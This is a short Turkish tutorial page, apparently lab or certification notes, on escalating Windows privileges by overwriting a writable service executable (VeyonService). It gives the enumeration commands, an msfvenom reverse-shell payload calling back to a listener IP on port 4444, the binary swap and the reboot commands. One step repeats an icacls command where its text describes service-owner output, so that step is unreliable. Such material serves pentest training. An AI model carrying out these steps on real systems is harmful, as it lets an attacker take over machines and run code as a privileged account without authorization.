---
layout: page
title: Get-ModifiableService
---

# Get-ModifiableService

<!-- İçeriği buraya ekleyebilirsiniz -->
```bash
Get-ModifiableService
```

![Get-ModifiableService örneği](/assets/images/get-modCommand.png)

Burada VeyonService'in değiştirilebilir olduğunu görmekteyiz.

Yetkileri kontrol etmek için

```bash
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

![Get-ModifiableService örneği2](/assets/images/get-modYetkiKontrolu.png)

I (Inherited) yani üst dizinden geliyor yetki. F (Full), yazma değiştirme okuma gibi yetkiler barındırıyor. 

---
Servisi çalıştıran kullanıcıyı bulmak için 

```bash
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```
![Get-ModifiableService örneği3](/assets/images/get-modKimCalistiriyor.png)

Burada SERVICE_START_NAME ile kimin başlattığını görebiliyoruz. Mevcut kullanıcıdan o kullanıcya geçiş yapabileceğimiz anlamına geliyor.

Bizim yapacağımız şey aynı dosya adında .exe oluşturup makineyi restart attıktan sonra shell alabilmek. Bunun için makineye reboot atıp atmamaya karar vermek için aşağıdaki komutu çalıştırıyoruz

```bash
.\accesschk64.exe /accepteula -ucqv VeyonService
```
![Get-ModifiableService örneği4](/assets/images/get-modStartStopKontrolu.png)
Burada SERVICE_START ve SERVICE_STOP görmediğimiz için makineye restart atmamız gerekecek.

zararlı .exe dosyamızı 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.225 LPORT=4444 -f exe >  reverse-shell.exe
```
karşıya yükledikten sonra powershell'de 

```bash
move veyon-service.exe veyon-service.exe.bak2
move ..\Desktop\revshell.exe veyon-service.exe
```
yapıp artık aynı adda zararlı.exe dosyamız mevcut.

makineye restart atmak için PowerShell'de
```bash
Restart-Computer
```

CMD'de 
```bash
shutdown /r /t 0
```

Kaynakça: [1] (https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107)